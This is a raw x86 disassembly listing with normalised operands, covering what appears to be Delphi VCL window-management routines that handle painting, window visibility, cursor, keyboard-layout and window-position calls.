jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44b484
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44acd4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44b4a8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_43af70
mov edi eax
mov eax edi
call sub_43b050
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_424118
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_44d054
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_43b150
jmp r-xdata
sub_44b530
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_448240
test bl bl
je r-xdata
mov eax edi
call sub_44d364
mov eax edi
call sub_44cf5c
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_44cf5c
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_44b5f0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_447e9c
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_44b640
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44d364
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_449914
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_40346c
sub_44b688
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_4462a8
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_44a940
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_466a28
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_464f10
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_44b7d8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_44b8b7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b8be
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_44d054
mov dl [ ebx + 0x184 ]
call sub_451cb4
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_464e88
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407f3c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_464c88
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_464c88
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_464c88
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_44b8c4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44b94e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b955
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_464e88
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407f3c
test eax eax
je r-xdata
mov eax ebx
call sub_44d054
mov dl 0x1
call sub_451c98
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_44b9b0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_416f04
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_44790c
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_44ba00
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_44ba34
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_40346c
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_40346c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_44ba74
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_44790c
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_44bacc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_420d74
mov edx [ r-xdata ]
call sub_403420
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_44bb04
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_418550
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44bb28
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_44d054
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_44bb84
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_44baf0
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_418550
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_44bbc4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_4058c0
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_4058c0
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_44bc30
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_44bcd8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bcdf
lea eax [ ebp - 0x4 ]
call sub_4058a8
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_444410
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_403270
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_4058a8
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_40346c
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_4058c0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ edi + 0x178 ] eax
sub_44bce8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_4498ec
xor edx edx
push ebp
push sub_44bdaa
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_40346c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bdb1
mov eax [ ebp - 0x4 ]
call sub_4498f4
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_44bdb1
mov eax [ ebp - 0x4 ]
call sub_45e10c
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4469c4
sub_44bdfc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4031b8
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4485cc
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_44be66
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_40346c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_4469c4
sub_44be80
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_44bea8
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_45e10c
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_45e014
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_40346c
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_44bea8
test al al
jne r-xdata
sub_44bf10
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44bea8
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_44e1c0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44bf3c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44bea8
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_44e1c0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44bf68
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_44bf90
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_45e10c
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_45e014
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_40346c
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_44bf90
test al al
jne r-xdata
sub_44bff8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44bf90
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44c018
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44bf90
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44c058
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_45e10c
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_40346c
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_44c058
test al al
jne r-xdata
sub_44c0bc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44c058
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44c0dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_449d84
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_449d48
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_44790c
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44c0dc
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_44c18c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_44c0dc
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_45e10c
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_44790c
test eax eax
jne r-xdata
sub_44c234
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44acd4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44c254
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44acd4
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44c288
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44acd4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44c2a8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_44c2f8
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_44c31c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_445a30
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_449d84
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_449d48
mov dl [ esp ]
mov si 0xffd1
call sub_40346c
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_44c374
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_40346c
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_44c398
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_40346c
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_44c3d0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4483e0
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_449de4
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_44a5f4
sub_44c408
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_40346c
pop esi
pop ebx
retn
mov eax ebx
call sub_446d9c
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_4044a8
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_4044a8
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_44c488
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44a9d4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4484b4
sub_44c4e8
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_44a748
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_449b44
pop ebx
retn
sub_44c518
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_44c540
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_44d358
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_449b44
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_44c5b0
push ebx
mov ebx eax
mov eax ebx
call sub_448320
mov eax ebx
call sub_44d358
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_449de4
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_42392c
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_44790c
sub_44c5ec
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_445010
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_44d054
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_44790c
sub_44c62c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44d358
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_44d054
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44c66c
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_449de4
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_44d358
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_44cf5c
sub_44c6ac
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_44d194
cmp [ edx + 0x8 ] 0x0
